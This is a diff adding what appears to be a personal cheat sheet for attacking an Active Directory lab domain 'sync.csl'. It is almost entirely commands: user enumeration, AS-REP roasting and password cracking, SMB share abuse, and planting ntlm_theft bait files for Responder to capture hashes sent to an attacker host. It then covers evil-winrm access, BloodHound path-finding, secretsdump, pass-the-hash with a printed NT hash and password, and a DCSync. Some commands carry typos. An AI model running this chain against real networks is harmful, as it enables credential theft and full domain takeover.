@@ -1,0 +1,91 @@
+$ ~/go/bin/kerbrute userenum --dc brute.csl -d brute.csl /usr/share/wordlists/rockyou.txt
+
+GetNPUsers.py -usersfile user -dc-ip 172.31.3.6 sync.csl/ -no-pass 
+
+john hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+crackmapexec smb -u manager -p '!!MILKSHAKE!!' --shares sync.csl
+
+smbclient -H \\\\sync.csl\\Department -U manager
+
+#need to mount the share
+sudo mount -t cifs -o 'user=kali' //172.31.3.6/Department /mnt/sync
+
+ls -la /mnt/sync
+
+ls /mnt/sync -laR
+
+#check the smb access
+
+smbcacls --no-pass //172.31.3.6/Department Accounts
+
+for i in $(ls /mnt/sync); do echo $i; smbcacls --no-pass //172.31.3.6/Department $i; echo; done
+
+#support directory have writepermission
+sudo mv test /mnt/sync/Support/test
+
+#now need to upload malicious file
+sudo responder -I tun1
+
+python3 ntlm_theft.py --generate all --server 10.10.0.35 --file subscribe
+
+cp subscribe/* /mnt/sync/Support
+
+#wait for some times some buddy will visite the directory then we will get the hash
+
+echo 'hash' >new_hash
+john new_hash --worklist=/usr/share/wordlist/rockyou.txt
+
+evil-winrm -u sysadmin-p 'pw'-i sync.csl
+
+#run the bloodhound
+neo4j console
+sudo ./BloodHound --no-sandbox
+
+upload /opt/Bloodhound/Collectors/SharpHound.exe
+.\ShareHound.exe
+download BloodHound.zip /home/kali/CS/sync/BloodHound.zip
+
+Upload the zip file in BloodHound
+
+#check the below policy
+Shortest Path from Owned Principals
+Shortest Paths to High Value Targets
+
+SYSAMIN@SYNC.CSL --> right click--> Mark User as Owned
+
+GetNPUsers.py sync.csl/manager
+
+Set-ADAccountControl -Identity manager -DoesNotRequiredPreAuth $true
+
+
+GetNPUsers.py sync.csl/manager
+
+
+GetNPUsers.py sync.csl/manager -format john
+
+Set-ADAccountControl -Identity manager -DoesNotRequiredPreAuth $false
+
+secretsdump.py sync.csl/manager:'!!MILKSHAKE!!'@172.31.3.6
+a72e3fae34d37ec6f82d7f2c3a72bc04
+
+evil-winrm -i 172.31.3.6 -u administrator -H a72e3fae34d37ec6f82d7f2c3a72bc04
+
+lsadump::dcsync /domain:sync.csl /user:Administrator
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
